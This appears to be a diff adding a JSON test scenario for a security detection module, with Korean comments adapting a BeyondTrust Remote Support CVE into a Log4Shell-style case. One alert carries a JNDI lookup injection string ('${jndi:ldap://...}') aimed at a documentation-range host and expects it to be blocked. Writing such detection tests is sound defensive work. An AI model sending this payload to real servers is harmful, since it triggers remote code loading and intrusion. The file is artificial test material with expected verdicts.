@@ -1,0 +1,40 @@
+{
+  "schema": "aleph.xdr.scenario.v1",
+  "moduleKey": "known-cve",
+  "source": {
+    "incident": "BeyondTrust Remote Support 제로데이(CVE-2026-102764)",
+    "date": "2026-10",
+    "summary": "메시징 구성요소의 결함이 악용되어 CISA KEV 목록에 등재됨",
+    "note": "이 모듈은 원격 조회 구문(Log4Shell류) 시그니처가 중심입니다. 실제 CVE는 성격이 다르나, 이 모듈이 탐지할 수 있도록 '공개 악용 요청이 원격 조회 구문 형태를 띤 국면'으로 각색했습니다. 조회 대상 주소는 문서용 대역으로 중립화했습니다."
+  },
+  "alerts": [
+    {
+      "id": "rc-kc-01",
+      "_expect": "block",
+      "_source": "BeyondTrust CVE-2026-102764 악용 시도",
+      "_adaptation": "요청 인자에 원격 조회 구문(jndi:ldap)이 들어간 형태로 각색. 조회 대상은 문서용 주소(203.0.113.9)로 중립화. 한계: 조회 구문이 아닌 CVE는 시그니처 추가 필요.",
+      "timestamp": "2026-11-07T13:21:02+09:00",
+      "agent": { "name": "support-portal" },
+      "rule": {
+        "level": 13,
+        "description": "CVE-2026-102764 악용 시도입니다. 요청 인자에 원격 조회 구문이 있습니다.",
+        "mitre": ["T1190"]
+      },
+      "data": { "srcip": "203.0.113.24", "url": "/support/ticket?msg=${jndi:ldap://203.0.113.9/a}" }
+    },
+    {
+      "id": "rc-kc-02",
+      "_expect": "alert",
+      "_source": "경계군(취약점 점검 도구 흔적)",
+      "_adaptation": "점검 도구 흔적(probe)만 있고 조회 구문은 없음 — 막지 않고 알림만.",
+      "timestamp": "2026-11-07T13:28:55+09:00",
+      "agent": { "name": "support-portal" },
+      "rule": {
+        "level": 6,
+        "description": "취약점 점검 도구 흔적이 있는 요청입니다. 조회 구문은 없습니다.",
+        "mitre": ["T1190"]
+      },
+      "data": { "srcip": "203.0.113.25", "url": "/support?probe=scan" }
+    }
+  ]
+}
